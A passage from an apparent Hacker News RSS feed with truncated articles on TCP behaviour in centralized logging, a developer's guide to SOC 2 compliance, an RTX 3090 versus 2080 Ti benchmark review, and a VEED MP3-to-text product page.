markdown--><ol>
<li>the buffer size automatically increases to a certain limit from the initial level</li>
<li>there is a limit on the number of pending connections</li>
<li>after the buffer is full (no matter how big it is), the sender is blocked, which means that sender don't have an ability to send messages to the server</li>
</ol>
<!--kg-card-end: markdown--><h2 id="tcp-in-logging">TCP in logging</h2><p>This TCP behavior raises server connectivity issues.</p><!--kg-card-begin: markdown--><ul>
<li>How to handle when the clients cannot connect and send logs<br>
If a client ‚Äúreceives‚Äù connection error (as in scenario above), then another chain of questions arises:
<ul>
<li>How long for should a client try to reconnect?</li>
<li>What should a client do if it cannot connect?
<ul>
<li>Do not send logs or</li>
<li>Do not launch / crash the application?</li>
</ul>
</li>
</ul>
</li>
<li>How do we know that our logs are not sent if we do not send them?</li>
</ul>
<!--kg-card-end: markdown--><p>A lot of questions. And all of this led me to an analogy from everyday life that describes the behavior of TCP in this extreme situation.</p><p>Imagine that your car is an analogue of a client socket and you plan to visit your favorite drive thru restaurant. As soon as you left the roadway, you established a connection (established connection, 3-way handshake successful) and got into the backlog queue. When your turn to place an order comes (<em>connection accepted</em>), you begin to exchange messages with the staff ‚Äì your order, your order changes, payment ‚Äì and with their managers if something goes wrong.</p><p>Usually everything is fine, as long as the restaurant copes with the flow of requests, but if the waiting queue is full (backlog queue), then all other connections are built in anticipation of the opportunity to get into the restaurant queue (all cars are on the roadway waiting for the opportunity to drive in).</p><p>If the waiting time in the roadway queue is exceeded and the connection cannot be established, the balancer (in our analogy, this may be the traffic controller at the intersection) can change the route for sending requests to another server (in our analogy, the restaurant).</p><blockquote>As we discussed in the previous article, you can increase the availability of logging by introducing a balancer that can redirect connections to the instance that is less loaded with connections, but then you need at least two such instances, and if you do not have idle hardware waiting, then this triggers additional costs.</blockquote><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Accept-1.png" alt=""><figcaption><a href="https://www.newstalkzb.co.nz/news/national/queue-at-auckland-mcdonalds-store-cause-traffic-jams/">Queue at Auckland McDonalds store cause traffic jams</a></figcaption></figure><p>If you still managed to connect, then as we saw earlier, the client does not know whether the server started processing it or not. What happens when the size of the system socket buffer is exhausted? (you can imagine that all the passengers of the car begin to tell the driver what they want to order). What to do with messages that are waiting to be sent? Create a buffer for sending within the application? How big do it? What to do when it ends? flood?</p><p>In the worst case, your application ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dev.sweatco.in/centralized-logging-delivery/">https://dev.sweatco.in/centralized-logging-delivery/</a></em></p>]]>
            </description>
            <link>https://dev.sweatco.in/centralized-logging-delivery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578707</guid>
            <pubDate>Thu, 24 Sep 2020 14:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Developer's Guide to SoC 2 Compliance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578450">thread link</a>) | @jacobwg
<br/>
September 24, 2020 | https://workos.com/blog/the-developers-guide-to-soc-2-compliance | <a href="https://web.archive.org/web/*/https://workos.com/blog/the-developers-guide-to-soc-2-compliance">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><p>Nobody wakes up in the morning excited to deal with a SOC 2 audit, but completing one will help your company grow and close larger deals faster. SOC 2 covers <em>a lot</em>, and it‚Äôs not just an engineering checkmark - but if you‚Äôre a developer at a not-huge company going through SOC 2 compliance, chances are you‚Äôll need to get involved. This guide will cover everything you need to know from a technical perspective, from basic access controls to encrypting data at rest. <em>‚Äç</em></p><p><em>(Note: this guide is NOT a comprehensive assessment of what you‚Äôll need to pass SOC 2 compliance, nor is it legal advice. The goal here is just to help developers understand what they‚Äôll need to do to make sure that tech and infrastructure aren‚Äôt holding things up.)</em></p><h2>What SOC 2 is and why it's important</h2><p><em>SOC 2</em> is a certification ‚Äì an objective third party checking your company out ‚Äì developed by the AICPA, one of the big ‚Äúgoverning bodies‚Äù of accountants in the U.S (riveting, I know). The way it works is that you hire an auditor to investigate how secure and trustworthy your company is, fill in any holes they identify, and then they certify you as SOC 2 compliant. Once you‚Äôve passed an audit, you can display the SOC 2 logo on your site, tell your customers and leads that you‚Äôre compliant, and close those bigger deals. </p><p>The important thing about SOC 2 is that it‚Äôs not just a stamp for giant enterprises - like <a href="https://workos.com/blog/the-developers-guide-to-sso">SSO</a> and <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">Directory Sync</a>, even fast growing startups are starting to require more advanced security measures before engaging with vendors. And as we‚Äôll see in a bit, most of what you‚Äôll need to work on to be SOC 2 compliant overlaps a lot with engineering best practices anyway. So if you‚Äôre considering whether SOC 2 compliance is worth it for your company, it might be a realistic fit earlier than you think - and help you stand out to potential customers.</p><p>Now if you‚Äôre thinking that SOC 2 implies the existence of a SOC 1, you‚Äôd be right, but SOC 1 is a lot less popular among SaaS startups. It‚Äôs generally a lower lift certification and doesn‚Äôt meet the security requirements that those larger deals are looking for. There‚Äôs also a SOC 3, but same story here - generally not the focus for the customers you‚Äôre trying to woo. SOC 2 is the big one.</p><p>So what exactly are these auditors looking for? What makes your company SOC 2 compliant? The answer, weirdly enough, is that criteria are subjective and company-specific - the auditor you work with will put together a plan. Generally, they‚Äôre looking for a few things:<br></p><ul role="list"><li>There‚Äôs quality <strong>oversight of the company</strong> as a whole (performance reviews, independent voices, background checks, etc.)</li><li>The <strong>SDLC</strong> (software development lifecycle) is transparent, trackable, and controlled (issue tracking, unit testing, version control, etc.)</li><li>Your <strong>application and underlying infrastructure</strong> are secure and monitored (encryption, logging, APM, vulnerability scans, etc.)</li><li>You‚Äôve implemented <strong>access controls</strong> for internal services and SaaS (de-provisioning accounts, 2FA, malware detection, etc.)</li></ul><p>If a lot of these examples look familiar to you, it‚Äôs because you‚Äôve probably already implemented them. The good news about SOC 2 is that as it relates to engineering, the requirements are generally pretty agreeable and a lot of modern SWE orgs already have issue tracking, review pipelines, vulnerability checks, and a good amount of the remaining checks auditors will be looking for. </p><p>We‚Äôll dive into the SDLC, app and infrastructure, access controls, and then take a look at how you can save time with pre-built software like <a href="https://www.vanta.com/">Vanta</a> that takes care of a lot of the annoying work you need to do for SOC 2, like policy generation.<strong>‚Äç</strong></p><h2><strong>The SDLC</strong>‚Äç</h2><p>Your auditor will put together a list of concrete checks that you‚Äôll need to either (a) provide evidence that you‚Äôve already done, or (b) get started on doing. Again - this is not a comprehensive list, but it should help you get started and think about what auditors will be looking for.<strong>‚Äç</strong></p><p><strong>‚Üí Issue Tracking</strong>‚Äç</p><p>Any ‚Äúissues‚Äù that relate to the core business - new features, products, bugs, vulnerabilities, etc. - should be tracked. There are a hundred ways to do this - if you‚Äôre at a bigger company you‚Äôre probably using <a href="https://www.atlassian.com/software/jira">JIRA</a>, the cool kids are using <a href="https://linear.app/">Linear</a>, and there‚Äôs also <a href="https://clubhouse.io/">Clubhouse</a>, <a href="https://guides.github.com/features/issues/">GitHub Issues</a>, and many many more. The auditors are just looking to make sure known problems don‚Äôt slip through the cracks, and when a problem arises it‚Äôs dealt with effectively and in a timely manner.<br></p><figure id="w-node-361755762ee0-e13c3243"><p><img src="https://assets-global.website-files.com/5f03ef1d331a69193fae6dcd/5f4fb0d32ee58930e6b6eb82_image%20(6).png" loading="lazy" alt=""></p></figure><p>They might ask for a sample of your tracked issues over a given time period. You‚Äôll save yourself a bunch of time down the road by finding a way to link commits and PRs to specific tickets, e.g. via a naming convention (BUG-453-fix-broken-dropdown).<strong>‚Äç</strong></p><p><strong>‚Üí Change Testing and Review Cycles</strong>‚Äç</p><p>Auditors will be looking for documented policies that govern how you track, test, approve, and validate changes to your core application. Now ideally if you‚Äôre reading this, you‚Äôre not pushing directly to master - you‚Äôve got a staging environment set up and a pull request process with required reviewers. Internal documentation might suffice here, but you‚Äôll probably need to generate a policy (something Vanta can help with - more on that later).</p><p>If you‚Äôre working via a monorepo, building foolproof review cycles is pretty easy (it‚Äôs just a setting in GitHub). But if you‚Äôve got a bunch of repositories all constantly changing, they should all ideally require reviews before merging in changes. Even if there‚Äôs only one engineer pushing code, laptops can get lost or stolen, and auditors will want to see that extra security to bestow the SOC 2 stamp.<strong>‚Äç</strong></p><h2><strong>Application and infrastructure</strong></h2><p>Here, auditors are trying to verify that your app is generally reliable, trackable, and that you fix things quickly when they come up. Again - all things that you probably already care about.<strong>‚Äç</strong></p><p><strong>‚Üí Encryption</strong>‚Äç</p><p>You‚Äôll generally want to encrypt customer data at rest, and make sure that sensitive requests (especially if they‚Äôre auth or customer data related) are encrypted in transit/motion (e.g. HTTPS). Ideally your site and app have SSL enforced, your certificate isn‚Äôt expired (duh), and there aren‚Äôt any known issues. Some auditors will also require an encryption policy that describes your company‚Äôs approach to encryption.<strong>‚Äç</strong></p><p><strong>‚Üí APM / Monitoring</strong>‚Äç</p><p>To be SOC 2 compliant, you‚Äôll need to set up a basic application monitoring system, either in house or via a vendor like <a href="https://www.datadoghq.com/">Datadog</a>. Auditors will also be interested in <em>what you do with this information</em> - how often is there downtime? How quickly does it get resolved? You might need to provide screenshots of outage statistics via your APM tool, and evidence that you resolved the issue via your issue tracking software. These usually come in the form of a post mortem / analysis and remedy of the root cause.</p><p>It‚Äôs not a given, but some auditors will specifically require that you set up a Load Balancer to handle traffic, and monitor that Load Balancer as well as your core app.<strong>‚Äç</strong></p><p><strong>‚Üí Logging and Backups</strong>‚Äç</p><p>Auditors will be looking for centralized logging from your app into a secure spot, via something custom like flat files, Elasticsearch, or an out of the box setup like Heroku (if you‚Äôre running on PaaS). You might be asked for daily backups - auditors are generally more concerned with your app‚Äôs data than your app itself, so if you‚Äôre using something like RDS, you can rely on their backup to S3 feature.<strong>‚Äç</strong></p><p><strong>‚Üí Vulnerabilities</strong>‚Äç</p><p>Unsurprisingly, this is a major focus of the audit process, even if it‚Äôs not a common day-to-day occurrence. Auditors are basically looking for 3 major things here:<br></p><ol role="list"><li>There‚Äôs a safe way for anyone (literally, anyone) to notify your company of vulnerabilities</li><li>Your team is proactively checking for vulnerabilities via review meetings and software</li><li>When a vulnerability gets uncovered, your team fixes it </li></ol><p>You‚Äôll want to set up an email inbox for disclosing vulnerabilities (e.g. <a href="https://workos.com/cdn-cgi/l/email-protection#21524442545348555861564e534a4e520f424e4c"><span data-cfemail="89faeceafcfbe0fdf0c9fee6fbe2e6faa7eae6e4">[email&nbsp;protected]</span></a>), put together a policy for how you handle incident response, and (if relevant) provide evidence that you‚Äôve resolved any major vulnerabilities (i.e. a post-mortem). Auditors will also look for proactive vulnerability scanning. If you‚Äôre running on managed infrastructure like Heroku, they do a lot of that for you. GitHub will also <a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-alerts-for-vulnerable-dependencies">notify you of any dependencies with known vulnerabilities</a>.<strong>‚Äç</strong></p><h2><strong>Access controls / SaaS</strong></h2><p>This is where things get a bit tedious. In addition to your core infra (AWS or whatever cloud you‚Äôre using), chances are you‚Äôre using a bunch of SaaS like PagerDuty, Segment, GitHub, and the like, some cloud based and some (potentially) on prem. Auditors are looking for rigid access controls: only relevant team members should have access to customer data and applications, and access needs to be revoked when employees leave the company.<strong>‚Äç</strong></p><p><strong>‚Üí Core Infrastructure Access</strong>‚Äç</p><p>Auditors will be looking for even stricter controls when it comes to managing core infra. In practice, this means a robust IAM setup in AWS (or your cloud provider of choice) with clear lines between admins and non-admins, and a review process for adding new folks to the organization. You might need to prove that review via a screenshot of someone asking permission, or something along those lines.</p><p>As part of this review, you‚Äôll probably end up needing to remove users from accounts that they previously had access to. Early on in the company lifecycle things are pretty free rein, but auditors will want to make sure that if you have no business querying the warehouse, you‚Äôre not on BigQuery.<strong>‚Äç</strong></p><p><strong>‚Üí De-provisioning Users</strong>‚Äç</p><p>If an employee leaves the company or gets terminated, their access to all company accounts - infrastructure, SaaS, any anything else - needs to be revoked, and auditors will often look for this to happen within one business day of the employee‚Äôs last day with the company. You‚Äôll probably need to do this manually for the first couple of years in the company lifecycle, but eventually you‚Äôll want to <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">set up Directory Sync so computers can do it for you</a>.<strong>‚Äç</strong></p><p><strong>‚Üí MFA</strong>‚Äç</p><p>Any method for accessing customer data needs to be protected by (at least) ‚Ä¶</p></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://workos.com/blog/the-developers-guide-to-soc-2-compliance">https://workos.com/blog/the-developers-guide-to-soc-2-compliance</a></em></p>]]>
            </description>
            <link>https://workos.com/blog/the-developers-guide-to-soc-2-compliance</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578450</guid>
            <pubDate>Thu, 24 Sep 2020 13:34:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Jittery ‚Äì A new type of knowledge service]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578403">thread link</a>) | @jittery
<br/>
September 24, 2020 | https://jittery.com/Jittery | <a href="https://web.archive.org/web/*/https://jittery.com/Jittery">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://jittery.com/Jittery</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578403</guid>
            <pubDate>Thu, 24 Sep 2020 13:29:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RTX 3090 vs. 2080 Ti ‚Äì Worth Upgrading?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578375">thread link</a>) | @SimonAC
<br/>
September 24, 2020 | https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading | <a href="https://web.archive.org/web/*/https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
                    <p>I‚Äôve compared Nvidia‚Äôs new RTX 3090 graphics card against the 2080 Ti from last generation in games at 4K, 1440p, and 1080p resolutions as well as content creator workloads to see what the differences are.</p>
<p>Let‚Äôs start with the spec differences.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a69ef578.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a69ef578.webp">The 3090 has around 141% more CUDA cores than the 2080 Ti and 118% more memory. The 3090‚Äôs memory is also faster, and the 3090 has higher base and boost clock speeds as well, so it‚Äôs basically better in all regards, though it does also use more power.</p>
<p>Of course, at the moment the 3080 is closer in price to the 2080 Ti, but I don‚Äôt have a 3080 yet, I don‚Äôt think anyone does, and although the 2080 Ti had a $1000 MSRP, it seemed to sell around the $1200 USD price point, so $300 below the 3090 launch price.</p>
<p>The system that I‚Äôm testing with uses the Intel i9-10900K overclocked to 5.2GHz on all 10 cores in an MSI Z490 ACE Motherboard with 32gb of DDR4-3200 CL14 memory running in dual channel.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a9308564.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a9308564.webp">I‚Äôve got MSI‚Äôs GeForce RTX 3090 Gaming X Trio, and my Aorus 2080 Ti to compare with.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aa5b3ab2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aa5b3ab2.webp">The latest drivers at the time of testing were used on both GPUs, so let‚Äôs get into the results.</p>
<h2>Gaming benchmarks</h2>
<p>Starting out with Microsoft Flight Simulator, I‚Äôve got the newer 3090 shown by the purple bars, and the older 2080 Ti shown by the red bars.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ab446748.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ab446748.webp">The three resolutions tested are on the left, starting from 1080p down the bottom, 1440p in the middle, and 4K up the top. In this test there was only a minor difference at 1080p, then the margin grows as we step up to higher resolutions. At 1440p the 3090 was 20% faster than the 2080 Ti, though this was the slowest result out of all 11 games tested at this resolution, then at 4K the 3090 was reaching 41% higher average frame rates.</p>
<p>Red Dead Redemption 2 was tested using the games benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ac7d266c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ac7d266c.webp">Again there‚Äôs less of a difference at 1080p, as these higher end GPUs are better utilized at higher resolutions. At 1080p the 3090 was around 19% faster, but then at 4K the 3090 had a massive 57% lead - the biggest improvement seen out of all games that I‚Äôve tested.</p>
<p>Battlefield 5 was tested in campaign mode by running through the same mission on both graphics cards.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ad9a7f6c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ad9a7f6c.webp">Interestingly the 2080 Ti actually had better 1% low results at 1080p, but this was the only time this happened. This game has a 200 FPS frame cap by default which the 3090 was hitting, so I suspect this may be why its 1% low was behind, given the 1% low on the 3090 was higher than this at 1440p. At 4K the 3090 is reaching a 45% higher average frame rate, even the 1% low from the 3090 is a fair amount ahead of the 2080 Ti‚Äôs average frame rate.</p>
<p>Shadow of the Tomb Raider was tested with the games built in benchmark.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aece7811.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aece7811.webp">The 2080 Ti was still delivering above 60 FPS in this test with the highest setting preset at 4K, but it‚Äôs no match for the 3090, which was again around 45% ahead. The difference is of course lower at lower resolutions, the 3090 is around 38% faster than the 2080 Ti at 1440p, then just 14% ahead at 1080p.</p>
<p>For Control I‚Äôll start with RTX off results.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9afcc4602.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9afcc4602.webp">At 1080p the 3090 has a modest 20% lead over the 2080 Ti, then a much higher 43% lead at 1440p, increasing further to a 53% higher average frame rate at 4K. The 3090 was still able to run the game well with above 60 FPS at 4K, making it a fair bit more playable compared to the 2080 Ti, at least with the highest setting preset that I‚Äôve tested.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b1ee431b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b1ee431b.webp">With RTX on and DLSS enabled the 3090 is now 35% faster than the 2080 Ti at 1080p, compared to 20% with RTX off. The differences are nowhere near as big at 1440p and 4K though, for instance at 4K in this test the 3090 is 55% ahead of the 2080 Ti, but then in the RTX off results shown earlier the 3090 was 53% ahead. Basically RTX and DLSS in this game is running better on the 3090 than the 2080 Ti, but outside of 1080p it‚Äôs not that much better.</p>
<p>I‚Äôve tested Metro Exodus with the game's benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b4244c86.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b4244c86.webp">There are some nice gains with the 3090. At 4K we‚Äôre looking at a 45% higher average frame rate from the 3090, and around 25% higher at the lower 1080p resolution.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b523b343.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b523b343.webp">In Death Stranding the 3090 was giving me 1% lows that were ahead of the average frame rate of the 2080 Ti at 4K and 1440p resolutions, it was close at 1080p but not quite there. Like many other games, we‚Äôre around the 46% point in terms of average FPS improvement with the 3090 at 4K.</p>
<p>The Witcher 3 is still being tested as you guys still voted for it in a poll I ran recently.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b62608cc.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b62608cc.webp">This game saw the lowest difference between the two GPUs at 4K, though the 3090 still had a 40% higher average frame rate, and again the 1% lows from it were ahead of even the averages from the 2080 Ti at both 4K and 1440p.</p>
<p>Assassin‚Äôs Creed Odyssey was tested with the built-in benchmark, and is another one you guys voted to see more of.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b77944ad.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b77944ad.webp">The 3090 was 22% faster than the 2080 Ti at 1080p, 25% faster at 1440p, and 42% faster at 4K, so below average increases compared to the other games tested at the higher resolutions.</p>
<p>Call of Duty Modern Warfare was tested in campaign mode.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b865cf9b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b865cf9b.webp">The 2080 Ti was still giving an above 60 FPS experience at 4K even with all settings maxed out, but once more the 3090 pushes things to the next level by averaging 100 FPS, a 43% improvement. This was another test where even the 3090‚Äôs 1% lows were ahead of the 2080 Ti‚Äôs averages.</p>
<p>Rainbow Six Siege was tested using the games benchmark tool with Vulkan.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b9637819.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b9637819.webp">The 2080 Ti was right on 144 FPS at 4K, so it‚Äôs probably still going to be pretty decent even if you actually have a high refresh 4K monitor, but the 3090 is again offering nice improvements, with a 48% higher average frame rate at this resolution, and it manages to push the 1080p result above 500 FPS, something I‚Äôve never seen before in this test.</p>
<h2>Overall gaming performance</h2>
<p>At 1080p on average over all 11 games tested the 3090 was under 22% faster than the 2080 Ti.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bb2021a2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bb2021a2.webp">In some titles like flight simulator, down the bottom, we‚Äôre seeing a negligible difference, while others such as Control with RTX enabled at the top still had nice gains.</p>
<p>At 1440p the 3090 was now 36% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bc3e0bf6.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bc3e0bf6.webp">As higher resolutions can typically make better use of the GPU we‚Äôre starting to see what the 3090 is capable of. Flight simulator was still the lowest improvement out of what was tested, while Control was at the top again.</p>
<p>At 4K the 3090 is now almost 47% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bd8eda28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bd8eda28.webp">This time Red Dead Redemption 2 was able to overtake Control for top spot with almost a 57% improvement, and even the worst result was still a 40% boost, so if you‚Äôre serious about 4K gaming something like the 3090 could be worth considering.</p>
<h2>Power usage</h2>
<p>When we look at total system power draw from the wall<img src="https://techplanet.today/storage/posts/2020/09/5f6c9beca71e2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9beca71e2.webp">the PC with the 3090 installed was using around 29% more power, pushing the system to over 500 watts. I tested Control here, as we just saw it was around 53% faster in terms of average F PS, so 29% more power from the wall for a 53% boost to FPS, sounds reasonable to me.</p>
<h2>Cost per frame</h2>
<p>Let‚Äôs check out value in gaming in terms of dollar per frame.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c00a4a28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c00a4a28.webp">If we consider that the 3090 is $1500 USD at launch, and the 2080 Ti was meant to be $1000, then that‚Äôs 50% more money for the 3090, but the 2080 Ti wasn‚Äôt really available at that price, so if we instead go with $1200 which is closer to what it was actually available for, then the 3090 is 25% more money. This of course doesn‚Äôt factor in that people have been fire selling their 2080 Ti‚Äôs in the lead up to the 3000 series release, at the moment it‚Äôs easy to score one for under $700 on the second hand market, so I‚Äôve listed that too.</p>
<p>The 3090 looks better than the 2080 Ti at $1200, but if you could actually get the 2080 Ti at $1000 in the past then the 3090 would be slightly worse from a dollar per frame perspective, and this is of course assuming the 3090 will be available at $1500, that‚Äôs still yet to be seen.</p>
<p>The 3090 isn‚Äôt exactly targeted towards gamers, but there‚Äôs no denying that it‚Äôs a beast in gaming. To get the most out of it though, you‚Äôre really going to want to focus on playing at higher resolutions like 1440p or 4K. If you‚Äôre a competitive 1080p gamer playing at competitive settings, in a lot of cases your CPU will probably matter more than going for a 3090 over some other decent but far cheaper GPU option. Even many GPU heavy titles tested here at 1080p didn‚Äôt see huge gains from the 3090.</p>
<h2>Content creation benchmarks</h2>
<p>I‚Äôve also tested both in content creator workloads, it‚Äôs not just all about gaming!<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c4cb5297.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c4cb5297.webp">I‚Äôve tested DaVinci Resolve with the Puget Systems benchmark, and the 3090 was scoring 42% higher than the 2080 Ti. Despite taking averages of 5 runs, the individual results were two to three hundred points different, so this might not be the most accurate test, hopefully by running it 5 times the results are decent but yeah it did vary between runs a fair bit.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c5f966fe.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c5f966fe.webp">I‚Äôve tested the V-Ray benchmark and saw massive gains from the 3090, which was scoring 119% higher than the 2080 Ti. This is testing compute power, and if you recall the 3090 has 141% more CUDA cores, so this sort of gain is expected in this type of workload.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c6d089a3.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c6d089a3.webp">Blender was tested with the Open Data Benchmark with the BMW and Classroom tests. This is also relying more on compute power, I selected the CUDA option when running the test, and the 3090 was completing these tasks 125% faster than the 2080 Ti, another serious win.</p>
<h2>Summary</h2>
<p>In Compute heavy workloads the 3090 is able to offer significant gains, so it really comes down to what you plan on running and of course your budget, as we saw this does not translate quite as well into gaming performance, though gaming performance was still a nice step up over the 2080 Ti at higher resolutions.</p>
<p>I‚Äôd be interested to hear in the comments if you‚Äôre considering the 3090, let me know what you plan on using it for. In gaming the RTX 3080 will be far better value at half the price and will be a much better sweet spot for many gamers, I‚Äôve got one of those in the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</a></em></p>]]>
            </description>
            <link>https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578375</guid>
            <pubDate>Thu, 24 Sep 2020 13:24:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: MP3 to Text]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578053">thread link</a>) | @sabbakeynejad
<br/>
September 24, 2020 | https://www.veed.io/tools/mp3-to-text#hn | <a href="https://web.archive.org/web/*/https://www.veed.io/tools/mp3-to-text#hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="Intro"><div><div id="w-node-be84c295ef36-ccc0cf0b"><h2><strong>Turn your MP3 into text files, online</strong></h2><p>Do you want to transcribe the speech from your MP3 into a text file? Well, now you can, with VEED! VEED‚Äôs online auto transcription tool is fast, free, and easy to use. Compatible not just with MP3s, but with WAVs, AACs, OGGs, M4As, and even video files - you can convert to text with the click of a button</p></div><p><img alt="" loading="lazy" src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png 1280w"></p></div><div><div id="w-node-be84c295ef39-ccc0cf0b"><h3><strong>MP3 to Text, Online</strong></h3><p>With VEED you can upload your MP3 files in your browser, no software required, and have a text transcription ready in no time</p></div><div id="w-node-be84c295ef3a-ccc0cf0b"><h3><strong>Automatic</strong></h3><p>No longer do you have to sit and listen, typing along to your MP3 files. Now VEED transcribes your MP3s automatically</p></div><div id="w-node-be84c295ef3b-ccc0cf0b"><h3><strong>Fast</strong></h3><p>Our super-fast, cloud-based servers will have your audio files uploaded, transcribed, and converted into text files in a matter of seconds. It‚Äôs so easy!</p></div><div id="w-node-be84c295ef3c-ccc0cf0b"><h3><strong>Edit</strong></h3><p>If you want to change anything, or add a note or comment, just click on a line of transcription and start typing!</p></div><div id="w-node-be84c295ef3d-ccc0cf0b"><h3><strong>Different Languages</strong></h3><p>VEED is able to recognise and transcribe languages from all over the world - 